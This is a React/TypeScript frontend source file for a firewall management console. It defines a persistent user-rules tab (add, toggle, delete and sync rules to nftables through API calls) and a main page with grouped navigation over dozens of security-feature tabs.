  action:"allow" as const, externalPort:"", internalPort:"",
  sourceIp:"", notes:"",
};

function MyRulesTab() {
  const [rules, setRules]       = useState<UserFwRule[]>([]);
  const [loading, setLoading]   = useState(true);
  const [showAdd, setShowAdd]   = useState(false);
  const [form, setForm]         = useState({ ...EMPTY_FORM });
  const [saving, setSaving]     = useState(false);
  const [syncing, setSyncing]   = useState(false);
  const [syncMsg, setSyncMsg]   = useState<string | null>(null);
  const [error, setError]       = useState<string | null>(null);

  const load = async () => {
    try {
      setLoading(true);
      const r = await fetch("/api/firewall/user-rules");
      if (!r.ok) throw new Error(`HTTP ${r.status}`);
      const d = await r.json();
      setRules(d.rules ?? []);
    } catch (e: any) {
      setError(e.message);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => { load(); }, []);

  const toggle = async (id: number) => {
    await fetch(`/api/firewall/user-rules/${id}/toggle`, { method:"POST" });
    load();
  };

  const del = async (id: number, label: string) => {
    if (!confirm(`Delete rule "${label}"? This cannot be undone.`)) return;
    await fetch(`/api/firewall/user-rules/${id}`, { method:"DELETE" });
    load();
  };

  const save = async () => {
    setSaving(true); setError(null);
    try {
      const body = {
        label:        form.label,
        protocol:     form.protocol,
        direction:    form.direction,
        action:       form.action,
        externalPort: Number(form.externalPort),
        internalPort: form.internalPort ? Number(form.internalPort) : undefined,
        sourceIp:     form.sourceIp || undefined,
        notes:        form.notes || undefined,
      };
      const r = await fetch("/api/firewall/user-rules", {
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body: JSON.stringify(body),
      });
      if (!r.ok) { const d = await r.json(); throw new Error(JSON.stringify(d.error)); }
      setShowAdd(false);
      setForm({ ...EMPTY_FORM });
      load();
    } catch (e: any) {
      setError(e.message);
    } finally {
      setSaving(false);
    }
  };

  const sync = async () => {
    setSyncing(true); setSyncMsg(null);
    try {
      const r = await fetch("/api/firewall/user-rules/sync", { method:"POST" });
      const d = await r.json();
      setSyncMsg(d.ok
        ? `✓ Synced — ${d.rulesWritten} rule${d.rulesWritten !== 1 ? "s" : ""} applied to nftables${d.dryRun ? " (dev mode)" : ""}`
        : `Error: ${d.error}`
      );
    } finally {
      setSyncing(false);
    }
  };

  const S: Record<string, React.CSSProperties> = {
    card:   { background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:"16px 18px", marginBottom:14 },
    th:     { textAlign:"left", padding:"5px 10px", color:"#444", fontSize:10, fontFamily:"monospace", fontWeight:500, borderBottom:"1px solid #111", textTransform:"uppercase" as const },
    td:     { padding:"7px 10px", fontSize:11, borderBottom:"1px solid #0d0d0d", verticalAlign:"middle" },
    mono:   { fontFamily:"monospace" },
    btn:    { background:"none", border:"1px solid #222", color:"#888", borderRadius:4, padding:"4px 10px", fontSize:10, cursor:"pointer", fontFamily:"monospace" },
    btnGrn: { background:"#00ff8811", border:"1px solid #00ff8833", color:"#00ff88", borderRadius:4, padding:"4px 10px", fontSize:10, cursor:"pointer", fontFamily:"monospace" },
    label:  { display:"block", fontSize:10, color:"#555", marginBottom:4, fontFamily:"monospace" },
    input:  { width:"100%", background:"#111", border:"1px solid #222", color:"#ccc", borderRadius:4, padding:"6px 10px", fontSize:12, fontFamily:"monospace", boxSizing:"border-box" as const },
    sel:    { width:"100%", background:"#111", border:"1px solid #222", color:"#ccc", borderRadius:4, padding:"6px 10px", fontSize:12, fontFamily:"monospace" },
  };

  const enabledCount  = rules.filter(r => r.enabled).length;
  const syncedCount   = rules.filter(r => r.synced).length;
  const activityRules = rules.filter(r => r.hitCount > 0).sort((a,b) => b.hitCount - a.hitCount);

  return (
    <div style={{ color:"#ccc" }}>

      {/* ── Header ─────────────────────────────────────────────────────────── */}
      <div style={{ display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:16, flexWrap:"wrap", gap:8 }}>
        <div>
          <div style={{ fontSize:15, fontWeight:700, color:"#fff", fontFamily:"monospace" }}>
            🔐 My Persistent Firewall Rules
          </div>
          <div style={{ fontSize:11, color:"#444", marginTop:3 }}>
            Rules are stored in the database — they survive server reboots, VPN logoffs, and reconnections.
            Every change is written to nftables immediately.
          </div>
        </div>
        <div style={{ display:"flex", gap:8 }}>
          <button style={S.btn} onClick={sync} disabled={syncing}>
            {syncing ? "Syncing…" : "↺ Force Sync"}
          </button>
          <button style={S.btnGrn} onClick={() => setShowAdd(true)}>
            + Add Rule
          </button>
        </div>
      </div>

      {/* ── Sync message ──────────────────────────────────────────────────── */}
      {syncMsg && (
        <div style={{ background: syncMsg.startsWith("✓") ? "#00ff8811" : "#ff444411",
          border:`1px solid ${syncMsg.startsWith("✓") ? "#00ff8833" : "#ff444433"}`,
          borderRadius:6, padding:"8px 12px", fontSize:11, marginBottom:12, fontFamily:"monospace" }}>
          {syncMsg}
        </div>
      )}

      {/* ── How it works ──────────────────────────────────────────────────── */}
      <div style={{ ...S.card, borderLeft:"3px solid #00ff8844" }}>
        <div style={{ fontSize:11, color:"#555", fontWeight:700, marginBottom:8, fontFamily:"monospace" }}>HOW IT WORKS</div>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(auto-fit, minmax(200px, 1fr))", gap:10, fontSize:11, color:"#555" }}>
          {[
            ["1. Create a rule", "Set protocol, direction, port, and whether to allow or block."],
            ["2. Auto-applied instantly", "Your rule is written to nftables on the server the moment you save it."],
            ["3. Persists forever", "Rules live in the database — restart the server, log off, reconnect — they're still there."],
            ["4. Toggle any time", "Flip a rule off without deleting it. It stays in the DB but nftables skips it."],
          ].map(([title, desc]) => (
            <div key={title}>
              <div style={{ color:"#00ff8888", fontFamily:"monospace", marginBottom:3 }}>{title}</div>
              <div style={{ color:"#444", lineHeight:1.5 }}>{desc}</div>
            </div>
          ))}
        </div>
      </div>

      {/* ── Stats bar ─────────────────────────────────────────────────────── */}
      <div style={{ display:"flex", gap:10, marginBottom:14, flexWrap:"wrap" }}>
        {[
          ["Total Rules",   String(rules.length),   "#ccc"],
          ["Active",        String(enabledCount),    "#00ff88"],
          ["Inactive",      String(rules.length - enabledCount), "#555"],
          ["Synced",        String(syncedCount),     "#4af"],
          ["Triggered",     String(activityRules.length), "#fa4"],
        ].map(([label, val, color]) => (
          <div key={label} style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:6, padding:"8px 14px", textAlign:"center" as const, minWidth:80 }}>
            <div style={{ fontSize:18, fontWeight:700, color, fontFamily:"monospace" }}>{val}</div>
            <div style={{ fontSize:9, color:"#444", fontFamily:"monospace", textTransform:"uppercase" as const, marginTop:2 }}>{label}</div>
          </div>
        ))}
      </div>

      {/* ── Error ─────────────────────────────────────────────────────────── */}
      {error && (
        <div style={{ background:"#ff444411", border:"1px solid #ff444433", borderRadius:6, padding:"8px 12px", fontSize:11, marginBottom:12, color:"#ff8888", fontFamily:"monospace" }}>
          {error}
        </div>
      )}

      {/* ── Rules table ───────────────────────────────────────────────────── */}
      <div style={S.card}>
        <div style={{ fontSize:11, color:"#555", fontWeight:700, marginBottom:10, fontFamily:"monospace" }}>PERSISTENT RULES</div>
        {loading ? (
          <div style={{ color:"#333", fontSize:11, fontFamily:"monospace", padding:8 }}>Loading…</div>
        ) : rules.length === 0 ? (
          <div style={{ color:"#333", fontSize:11, fontFamily:"monospace", padding:16, textAlign:"center" as const }}>
            No rules yet. Click <span style={{ color:"#00ff88" }}>+ Add Rule</span> to create your first persistent firewall rule.
          </div>
        ) : (
          <div style={{ overflowX:"auto" as const }}>
            <table style={{ width:"100%", borderCollapse:"collapse" }}>
              <thead>
                <tr>
                  {["Label","Proto","Direction","Port","Tunnel IP","Action","Hits","Status","Synced",""].map(h => (
                    <th key={h} style={S.th}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {rules.map(r => (
                  <tr key={r.id} style={{ opacity: r.enabled ? 1 : 0.4 }}>
                    <td style={{ ...S.td, ...S.mono, color:"#ccc", maxWidth:140, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>
                      {r.label}
                      {r.notes && <div style={{ fontSize:9, color:"#444", marginTop:2 }}>{r.notes}</div>}
                    </td>
                    <td style={S.td}><Bdg label={r.protocol.toUpperCase()} color={PROTO_COLOR[r.protocol]} sm /></td>
                    <td style={S.td}><Bdg label={r.direction} color={DIR_COLOR[r.direction]} sm /></td>
                    <td style={{ ...S.td, ...S.mono, color:"#aaa" }}>
                      {r.externalPort}
                      {r.internalPort && r.internalPort !== r.externalPort && (
                        <span style={{ color:"#555" }}> → {r.internalPort}</span>
                      )}
                      {r.sourceIp && <div style={{ fontSize:9, color:"#444" }}>src: {r.sourceIp}</div>}
                    </td>
                    <td style={{ ...S.td, ...S.mono, color:"#555", fontSize:10 }}>{r.tunnelIp ?? "—"}</td>
                    <td style={S.td}><Bdg label={r.action.toUpperCase()} color={ACT_COLOR[r.action]} sm /></td>
                    <td style={{ ...S.td, ...S.mono, color: r.hitCount > 0 ? "#fa4" : "#333" }}>
                      {r.hitCount > 0 ? r.hitCount.toLocaleString() : "—"}
                      {r.lastHitAt && <div style={{ fontSize:9, color:"#555" }}>{new Date(r.lastHitAt).toLocaleDateString()}</div>}
                    </td>
                    <td style={S.td}>
                      <button
                        onClick={() => toggle(r.id)}
                        style={{ ...S.btn, color: r.enabled ? "#00ff88" : "#555", borderColor: r.enabled ? "#00ff8833" : "#1a1a1a" }}
                        title={r.enabled ? "Click to disable" : "Click to enable"}
                      >
                        {r.enabled ? "● Active" : "○ Off"}
                      </button>
                    </td>
                    <td style={{ ...S.td, ...S.mono, fontSize:10, color: r.synced ? "#00ff8866" : "#fa466" }}>
                      {r.synced ? "✓" : "pending"}
                    </td>
                    <td style={S.td}>
                      <button onClick={() => del(r.id, r.label)} style={{ ...S.btn, color:"#ff4444", borderColor:"#ff444422" }} title="Delete permanently">
                        <Trash2 size={11} />
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* ── Activity feed ─────────────────────────────────────────────────── */}
      {activityRules.length > 0 && (
        <div style={S.card}>
          <div style={{ fontSize:11, color:"#555", fontWeight:700, marginBottom:10, fontFamily:"monospace" }}>
            🔥 RULE ACTIVITY — Matched Connections
          </div>
          <div style={{ fontSize:10, color:"#444", marginBottom:10 }}>
            These rules have been triggered by real traffic. Hit counts are incremented by the server log parser.
          </div>
          {activityRules.map(r => (
            <div key={r.id} style={{ display:"flex", alignItems:"center", gap:10, padding:"6px 0", borderBottom:"1px solid #0d0d0d" }}>
              <div style={{ flex:1, fontFamily:"monospace", fontSize:11, color:"#ccc" }}>{r.label}</div>
              <Bdg label={`port ${r.externalPort}`} color="#555" sm />
              <Bdg label={r.action.toUpperCase()} color={ACT_COLOR[r.action]} sm />
              <div style={{ fontFamily:"monospace", fontSize:12, color:"#fa4", minWidth:40, textAlign:"right" as const }}>
                {r.hitCount.toLocaleString()}×
              </div>
              <div style={{ fontSize:10, color:"#444", minWidth:80, textAlign:"right" as const }}>
                {r.lastHitAt ? new Date(r.lastHitAt).toLocaleString() : ""}
              </div>
            </div>
          ))}
        </div>
      )}

      {/* ── Add Rule Modal ────────────────────────────────────────────────── */}
      {showAdd && (
        <div style={{ position:"fixed", inset:0, background:"#000000cc", zIndex:999, display:"flex", alignItems:"center", justifyContent:"center" }}>
          <div style={{ background:"#0d0d0d", border:"1px solid #222", borderRadius:10, padding:24, width:480, maxWidth:"95vw", maxHeight:"90vh", overflowY:"auto" }}>
            <div style={{ fontSize:14, fontWeight:700, color:"#fff", fontFamily:"monospace", marginBottom:16 }}>
              + Add Persistent Firewall Rule
            </div>

            <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:12, marginBottom:12 }}>
              <div style={{ gridColumn:"1/-1" }}>
                <label style={S.label}>Rule Label *</label>
                <input style={S.input} placeholder='e.g. "Game server", "Block Torrent"'
                  value={form.label} onChange={e => setForm(f => ({ ...f, label: e.target.value }))} />
              </div>

              <div>
                <label style={S.label}>Protocol</label>
                <select style={S.sel} value={form.protocol}
                  onChange={e => setForm(f => ({ ...f, protocol: e.target.value as any }))}>
                  <option value="tcp">TCP</option>
                  <option value="udp">UDP</option>
                  <option value="both">TCP + UDP</option>
                </select>
              </div>
              <div>
                <label style={S.label}>Direction</label>
                <select style={S.sel} value={form.direction}
                  onChange={e => setForm(f => ({ ...f, direction: e.target.value as any }))}>
                  <option value="inbound">Inbound (coming in)</option>
                  <option value="outbound">Outbound (going out)</option>
                  <option value="both">Both</option>
                </select>
              </div>
              <div>
                <label style={S.label}>Action</label>
                <select style={S.sel} value={form.action}
                  onChange={e => setForm(f => ({ ...f, action: e.target.value as any }))}>
                  <option value="allow">Allow ✓</option>
                  <option value="block">Block ✗</option>
                </select>
              </div>
              <div>
                <label style={S.label}>External Port * (1–65535)</label>
                <input style={S.input} type="number" min={1} max={65535} placeholder="e.g. 25565"
                  value={form.externalPort} onChange={e => setForm(f => ({ ...f, externalPort: e.target.value }))} />
              </div>
              <div>
                <label style={S.label}>Internal Port (optional)</label>
                <input style={S.input} type="number" min={1} max={65535} placeholder="Same as external"
                  value={form.internalPort} onChange={e => setForm(f => ({ ...f, internalPort: e.target.value }))} />
              </div>
              <div>
                <label style={S.label}>Source IP / CIDR (optional)</label>
                <input style={S.input} placeholder="e.g. 1.2.3.4/32 or blank for any"
                  value={form.sourceIp} onChange={e => setForm(f => ({ ...f, sourceIp: e.target.value }))} />
              </div>
              <div style={{ gridColumn:"1/-1" }}>
                <label style={S.label}>Notes (optional)</label>
                <input style={S.input} placeholder="Why does this rule exist?"
                  value={form.notes} onChange={e => setForm(f => ({ ...f, notes: e.target.value }))} />
              </div>
            </div>

            <div style={{ background:"#00ff8808", border:"1px solid #00ff8822", borderRadius:6, padding:"8px 12px", fontSize:10, color:"#00ff8888", marginBottom:14, fontFamily:"monospace" }}>
              This rule will be saved to the database and applied to nftables immediately.
              It will automatically reload every time the server restarts — you never need to re-enter it.
            </div>

            {error && (
              <div style={{ background:"#ff444411", border:"1px solid #ff444433", borderRadius:4, padding:"6px 10px", fontSize:10, color:"#ff8888", marginBottom:10, fontFamily:"monospace" }}>
                {error}
              </div>
            )}

            <div style={{ display:"flex", gap:8, justifyContent:"flex-end" }}>
              <button style={S.btn} onClick={() => { setShowAdd(false); setForm({ ...EMPTY_FORM }); setError(null); }}>
                Cancel
              </button>
              <button
                style={{ ...S.btnGrn, opacity: saving || !form.label || !form.externalPort ? 0.5 : 1 }}
                onClick={save}
                disabled={saving || !form.label || !form.externalPort}
              >
                {saving ? "Saving…" : "Save Rule"}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default function Firewall() {
  const getInitialTab = () => {
    try { return new URLSearchParams(window.location.search).get("tab") ?? "overview"; } catch { return "overview"; }
  };
  const [tab, setTab] = usePersistedState<string>("firewall_tab", getInitialTab());
  const [location] = useLocation();

  // Auto-detect which group contains the current tab
  const findGroup = (t: string) => {
    for (const [gid, g] of Object.entries(TAB_GROUPS)) {
      if (g.tabs.some(tb => tb.id === t)) return gid;
    }
    return "core";
  };

  const [openGroups, setOpenGroups] = useState<Record<string,boolean>>(() => {
    const initial: Record<string,boolean> = {};
    const activeGroup = findGroup(getInitialTab());
    for (const gid of Object.keys(TAB_GROUPS)) {
      initial[gid] = gid === activeGroup;
    }
    return initial;
  });

  // Sync tab state when user navigates via the left nav (wouter location change)
  useEffect(() => {
    const t = new URLSearchParams(window.location.search).get("tab") ?? "overview";
    setTab(t);
    const gid = findGroup(t);
    setOpenGroups(prev => ({ ...prev, [gid]: true }));
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [location]);

  const switchTab = (t: string) => {
    setTab(t);
    const gid = findGroup(t);
    setOpenGroups(prev => ({ ...prev, [gid]: true }));
    try {
      const u = new URL(window.location.href);
      u.searchParams.set("tab", t);
      window.history.replaceState({}, "", u.toString());
      window.dispatchEvent(new CustomEvent("fw-tab-change"));
    } catch { /* noop */ }
  };

  const toggleGroup = (gid: string) =>
    setOpenGroups(prev => ({ ...prev, [gid]: !prev[gid] }));

  const activeGroupId = findGroup(tab);

  return (
    <div style={{ padding:"20px 24px", minHeight:"100vh", background:"#050505", color:"#ccc" }}>
      {/* ── Header ────────────────────────────────────────────────── */}
      <div style={{ marginBottom:20 }}>
        <div style={{ display:"flex", alignItems:"center", gap:10, marginBottom:4 }}>
          <Shield size={20} color="#00ff88"/>
          <h1 style={{ margin:0, fontSize:19, fontWeight:800, color:"#fff", fontFamily:"monospace" }}>GhostOS™ Firewall</h1>
          <span style={{ fontSize:10, color:"#333", fontFamily:"monospace" }}>ProxhqVPN NGFW v1.0 · © 2026 Alpha Unlimited Technologies LLC</span>
        </div>
        <p style={{ margin:0, fontSize:11, color:"#444" }}>
          Next-generation firewall with SymScript™ proprietary symbolic command language — 60+ security engines
        </p>
      </div>

      {/* ── Two-column layout ─────────────────────────────────────── */}
      <div style={{ display:"flex", gap:16, alignItems:"flex-start" }}>

        {/* Left sidebar — grouped navigation */}
        <div style={{
          width: 230, flexShrink: 0, position: "sticky", top: 20,
          maxHeight: "calc(100vh - 120px)", overflowY: "auto",
          background: "#0a0a0a", border: "1px solid #1a1a1a", borderRadius: 10,
          scrollbarWidth: "none",
        }}>
          {Object.entries(TAB_GROUPS).map(([gid, group]) => {
            const isOpen = openGroups[gid] ?? false;
            const groupActive = gid === activeGroupId;
            return (
              <div key={gid} style={{ borderBottom:"1px solid #0f0f0f" }}>
                {/* Group header */}
                <button
                  onClick={() => toggleGroup(gid)}
                  style={{
                    width:"100%", display:"flex", alignItems:"center",
                    justifyContent:"space-between",
                    padding:"10px 14px", background: groupActive ? "#00ff8808" : "none",
                    border:"none", cursor:"pointer", textAlign:"left",
                  }}
                >
                  <div style={{ display:"flex", alignItems:"center", gap:8 }}>
                    <span style={{ fontSize:13 }}>{group.icon}</span>
                    <span style={{
                      fontSize:10, fontWeight:700,
                      color: groupActive ? "#00ff88" : "#666",
                      fontFamily:"monospace", textTransform:"uppercase", letterSpacing:"0.08em",
                    }}>
                      {group.label}
                    </span>
                  </div>
                  <div style={{ display:"flex", alignItems:"center", gap:5 }}>
                    <span style={{ fontSize:9, color:"#2a2a2a", background:"#141414", borderRadius:8, padding:"1px 5px", fontFamily:"monospace" }}>
                      {group.tabs.length}
                    </span>
                    {isOpen
                      ? <ChevronDown size={10} color={groupActive?"#00ff8866":"#333"}/>
                      : <ChevronRight size={10} color="#2a2a2a"/>
                    }
                  </div>
                </button>

                {/* Tab list */}
                {isOpen && (
                  <div style={{ paddingBottom:4 }}>
                    {group.tabs.map(tb => {
                      const active = tab === tb.id;
                      return (
                        <button
                          key={tb.id}
                          onClick={() => switchTab(tb.id)}
                          title={tb.desc}
                          style={{
                            width:"100%", display:"flex", alignItems:"center", gap:9,
                            padding:"7px 14px 7px 20px",
                            background: active ? "#00ff8811" : "none",
                            border:"none",
                            borderLeft: active ? "3px solid #00ff88" : "3px solid transparent",
                            cursor:"pointer", textAlign:"left",
                          }}
                        >
                          <span style={{ color: active ? "#00ff88" : "#333", flexShrink:0, lineHeight:1 }}>
                            {TAB_ICONS[tb.id]}
                          </span>
                          <div style={{ minWidth:0 }}>
                            <div style={{ fontSize:11, color: active ? "#fff" : "#888", fontFamily:"monospace", lineHeight:1.3, whiteSpace:"nowrap", overflow:"hidden", textOverflow:"ellipsis" }}>
                              {tb.label}
                            </div>
                            <div style={{ fontSize:9, color:"#333", lineHeight:1.2, marginTop:1, whiteSpace:"nowrap", overflow:"hidden", textOverflow:"ellipsis" }}>
                              {tb.desc}
                            </div>
                          </div>
                        </button>
                      );
                    })}
                  </div>
                )}
              </div>
            );
          })}
        </div>

        {/* Right content area */}
        <div style={{ flex:1, minWidth:0 }}>
          {/* Breadcrumb */}
          <div style={{ display:"flex", alignItems:"center", gap:6, marginBottom:14, fontSize:10, color:"#333", fontFamily:"monospace" }}>
            <span style={{ color:"#444" }}>🛡 Firewall</span>
            <span>›</span>
            <span style={{ color:"#555" }}>{TAB_GROUPS[activeGroupId]?.label ?? "—"}</span>
            <span>›</span>
            <span style={{ color:"#00ff88" }}>
              {TAB_GROUPS[activeGroupId]?.tabs.find(tb => tb.id === tab)?.label ?? tab}
            </span>
          </div>

          <TabErrorBoundary key={tab} tabName={tab}>
            {tab==="overview"    && <OverviewTab/>}
            {tab==="ghostos"     && <GhostOsTab/>}
            {tab==="ips"         && <IpsTab/>}
            {tab==="dpi"         && <DpiTab/>}
            {tab==="threat"      && <ThreatTab/>}
            {tab==="zones"       && <ZonesTab/>}
            {tab==="rules"       && <RulesTab/>}
            {tab==="blacklist"   && <BlacklistTab/>}
            {tab==="analytics"   && <AnalyticsTab/>}
            {tab==="export"      && <ExportTab/>}
            {tab==="analyzer"    && <PayloadAnalyzerTab/>}
            {tab==="aliases"     && <AliasesTab/>}
            {tab==="schedules"   && <SchedulesTab/>}
            {tab==="nat"         && <NatTab/>}
            {tab==="qos"         && <QosTab/>}
            {tab==="wan"         && <WanGroupsTab/>}
            {tab==="stateTable"  && <StateTableTab/>}
            {tab==="portscans"   && <PortscansTab/>}
            {tab==="tls"         && <TlsTab/>}
            {tab==="dnsMonitor"  && <DnsMonitorTab/>}
            {tab==="suppressions"&& <SuppressionsTab/>}
            {tab==="eveExport"   && <EveExportTab/>}
            {tab==="proxy"       && <ProxyRulesTab/>}
            {tab==="ebpf"        && <EbpfTab/>}
            {tab==="quic"        && <QuicTab/>}
            {tab==="eta"         && <EtaTab/>}
            {tab==="ech"         && <EchTab/>}
            {tab==="doh"         && <DohTab/>}
            {tab==="lateral"     && <LateralTab/>}
            {tab==="netflow"     && <NetflowTab/>}
            {tab==="supplychain" && <SupplyChainTab/>}
            {tab==="airules"     && <AiRulesTab/>}
            {tab==="rpki"        && <RpkiTab/>}
            {tab==="deception"   && <DeceptionTab/>}
            {tab==="geoip"       && <GeoipTab/>}
            {tab==="quarantine"  && <QuarantineTab/>}
            {tab==="selinux"     && <SelinuxTab/>}
            {tab==="apparmor"    && <ApparmorTab/>}
            {tab==="sbom"        && <SbomTab/>}
            {tab==="auditd"      && <AuditdTab/>}
            {tab==="nftables"    && <NftablesTab/>}
            {tab==="kernelharden"&& <KernelHardenTab/>}
            {tab==="mls"         && <MlsTab/>}
            {tab==="zerotrust"   && <ZeroTrustTab/>}
            {tab==="hostsimm"    && <HostsImmTab/>}
            {tab==="tracking"    && <TrackingTab/>}
            {tab==="telemetry"   && <TelemetryTab/>}
            {tab==="startup"     && <StartupTab/>}
            {tab==="rootkit"     && <RootkitTab/>}
            {tab==="shredder"    && <ShredderTab/>}
            {tab==="pup"         && <PupTab/>}
            {tab==="registry"    && <RegistryTab/>}
            {tab==="avengine"    && <ProxhqAvTab/>}
            {tab==="iocdb"       && <IocDbTab/>}
            {tab==="yaraengine"  && <YaraEngineTab/>}
            {tab==="looptrap"    && <LoopTrapTab/>}
            {tab==="labyrinth"   && <LabyrinthTab/>}
            {tab==="tarpit"      && <TarPitTab/>}
            {tab==="nodesync"    && <NodeSyncTab/>}
            {tab==="atr"         && <AtrTab/>}
            {tab==="peerrules"   && <PeerRulesTab/>}
            {tab==="ddos"        && <DdosTab/>}
            {tab==="optimizer"   && <OptimizerTab/>}
            {tab==="riskscore"   && <RiskScoreTab/>}
            {tab==="myrules"     && <MyRulesTab/>}
          </TabErrorBoundary>
        </div>
      </div>
    </div>
  );
}
